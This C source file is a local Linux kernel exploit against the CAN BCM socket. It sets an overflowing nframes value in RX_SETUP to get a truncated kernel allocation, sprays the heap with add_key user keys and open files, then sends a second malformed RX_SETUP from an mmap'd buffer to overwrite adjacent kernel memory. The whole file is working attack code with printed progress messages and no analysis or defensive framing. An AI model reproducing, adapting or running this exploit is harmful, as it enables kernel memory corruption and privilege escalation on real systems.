#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <keyutils.h>
#include <stdint.h>
#include <stdbool.h>
#include <pthread.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/xfrm.h>
#include <linux/netlink.h>

#define ALLOCATION 256

#ifndef PF_CAN
#define PF_CAN 29
#endif

#ifndef CAN_BCM
#define CAN_BCM 2
#endif

#define MAX_PAYLOAD 2048

struct sockaddr_can {
	sa_family_t can_family;
	int can_ifindex;
	union {
		struct { uint32_t rx_id, tx_id; } tp;
	} can_addr;
};

struct can_frame {
	uint32_t can_id;
	uint8_t can_dlc;
	uint8_t data[8] __attribute__((aligned(8)));
};

struct bcm_msg_head {
	uint32_t opcode;
	uint32_t flags;
	uint32_t count;
	struct timeval ival1, ival2;
	uint32_t can_id;
	uint32_t nframes;
	struct can_frame frames[0];
};

#define RX_SETUP 5
#define RX_DELETE 6
#define CFSIZ sizeof(struct can_frame)
#define MHSIZ sizeof(struct bcm_msg_head)


int fd[10];
int alloc_file() {
    int i = 0;
    char filename[10];
    memset(filename, 0, 10);
    for (i = 0; i < 10; i++) {
        sprintf(filename, "test%d", i);
        fd[i] = open(filename, O_CREAT);
        if(fd[i] < 0) {
            perror("alloc_file\n");
            return -1;
        }
    }
    return 0;
}

void defragment() {
	int i = 0;
    char type[5] = "user";
    char* description = (char*)malloc(sizeof(char)*4);
    char* payload = (char*)malloc(sizeof(char)*0x100-0x18); // 256
    memset(payload, 'A', 0x100-0x18-0x1);
    for (i = 0; i < 0x600 ; i++) {
        key_serial_t key;
        sprintf(description, "%d", i);
        key = add_key(type, description, payload, strlen(payload), KEY_SPEC_USER_KEYRING);
        if (key == -1) {
            perror("add_key");
            exit(0);
        }
    }
}

int main() {

	int i, ret, sock, cnt, base, smashed;
	int diff, active, total, active_new, total_new;
	int len, sock_len, mmap_len;
	struct sockaddr_can addr;
	struct bcm_msg_head *msg;
	void *efault;
	char *buf;
    int err;

    defragment();

	printf("[+] creating PF_CAN socket...\n");
	sock = socket(PF_CAN, SOCK_DGRAM, CAN_BCM);
	if (sock < 0) {
		printf("[-] kernel lacks CAN packet family support\n");
		exit(1);
	}

	printf("[+] connecting PF_CAN socket...\n");
	memset(&addr, 0, sizeof(addr));
	addr.can_family = PF_CAN;
	ret = connect(sock, (struct sockaddr *) &addr, sizeof(addr));
	if (sock < 0) {
		printf("[-] could not connect CAN socket\n");
		exit(1);
	}

	printf("[+] corrupting BCM OP with truncated allocation via RX_SETUP...\n");
	len = MHSIZ + (CFSIZ * (ALLOCATION / 16));
	msg = malloc(len);
	memset(msg, 0, len);
	msg->can_id = 2959;
	// CFSIZ = 0x10
	// ALLOCATION = 256 = 0x10 * 16
	// UINT_MAX = 0xffffffff
	// kernel will allocate 256/16  = 0x10 
	// struct can_frame for twice in 
	// kmem-256
	msg->nframes = (UINT_MAX / CFSIZ) + 1 +  (ALLOCATION / 16);

	// first sendmsg
	msg->opcode = RX_SETUP;
	ret = send(sock, msg, len, 0);
	if (ret < 0) {
		printf("[-] kernel rejected malformed CAN header\n");
		exit(1);
	}

	err = alloc_file();
	if (err == -1) {
		fprintf(stderr, "alloc_file error\n");
		exit(-1);
	}
	
    /************** overwrite **************/

	printf("[+] mmap'ing truncated memory to short-circuit/EFAULT the memcpy_fromiovec...\n");

	// 0x10*256/16*3 = 0x10*3 = 0x30
	// mmap_len = MHSIZ + (CFSIZ * (ALLOCATION / 16) * 3) + 0x2b;
	mmap_len = MHSIZ + (CFSIZ * (ALLOCATION / 16) * 4) ;
	efault = mmap(NULL, mmap_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	printf("[+] mmap'ed mapping of length %d at %p\n", mmap_len, efault);
	printf("[+] smashing adjacent shmid with dummy payload via malformed RX_SETUP...\n");

	msg = (struct bcm_msg_head *) efault;
	memset(msg, 0, mmap_len);
	msg->can_id = 2959;
	// tell kernel that more than 
	// ALLOCATION/16*3 bytes need to be copied
	msg->nframes = (ALLOCATION / 16) * 5;

	// second sendmsg
	msg->opcode = RX_SETUP;
	buf = (char*) msg;

	ret = send(sock, msg, mmap_len, 0);
	if (ret != -1 && errno != EFAULT) {
		printf("[-] couldn't trigger EFAULT, exploit aborting!\n");
		exit(1);
	}

	return 0;
}
